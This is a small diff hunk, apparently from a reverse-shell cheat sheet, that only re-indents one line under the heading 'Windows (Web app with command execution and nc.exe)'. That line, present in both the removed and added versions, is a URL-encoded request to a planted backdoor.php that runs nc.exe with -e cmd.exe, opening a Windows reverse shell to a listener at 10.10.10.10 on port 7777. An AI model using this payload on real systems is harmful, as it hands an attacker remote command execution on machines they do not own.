@@ -258,5 +258,5 @@ PowerShell with nc.exe or another rev shell .exe
 
 <h4>Windows (Web app with command execution and nc.exe) </h4>
 
-http://1.1.1.1/backdoor.php?cmd=%22nc.exe%20-vn%2010.10.10.10%207777%20-e%20cmd.exe%22
+    http://1.1.1.1/backdoor.php?cmd=%22nc.exe%20-vn%2010.10.10.10%207777%20-e%20cmd.exe%22
 
